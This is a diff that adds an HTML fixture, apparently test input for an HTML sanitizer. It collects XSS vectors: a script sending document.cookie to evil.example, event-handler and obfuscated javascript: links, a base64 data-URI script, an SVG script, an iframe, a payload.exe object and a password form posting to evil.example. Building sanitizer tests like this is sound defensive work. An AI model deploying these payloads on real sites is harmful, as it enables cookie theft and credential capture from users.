@@ -1,0 +1,18 @@
+<html>
+	<head><title>Pasted from the web</title><script>fetch('https://evil.example/steal?c=' + document.cookie)</script></head>
+	<body onload="alert('body')">
+		<script type="text/javascript">alert('inline script')</script>
+		<style>body { background: url(javascript:alert(1)) }</style>
+		<p>Click <a href="javascript:alert('link')">here</a> or <a href=" JaVa&#x0A;Script:alert(2)">there</a> or <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">this</a>.</p>
+		<p onclick="alert('click')">Safe <a href="https://example.org/ok" onmouseover="alert(3)">link</a></p>
+		<img src="x" onerror="alert('onerror')" />
+		<img src="javascript:alert('img')" />
+		<img src="https://graph.microsoft.com/v1.0/me/onenote/resources/0-REDIR!1/$value" data-src-type="image/png" />
+		<img src="https://evil.example/pixel.png" data-src-type="image/png" />
+		<object data="https://evil.example/payload.exe" data-attachment="payload.exe" type="application/octet-stream" />
+		<iframe src="https://evil.example/frame"><p>inside iframe</p></iframe>
+		<svg><script>alert('svg')</script></svg>
+		<form action="https://evil.example"><input name="password" /></form>
+		<p>&lt;3 escaped text stays text</p>
+	</body>
+</html>
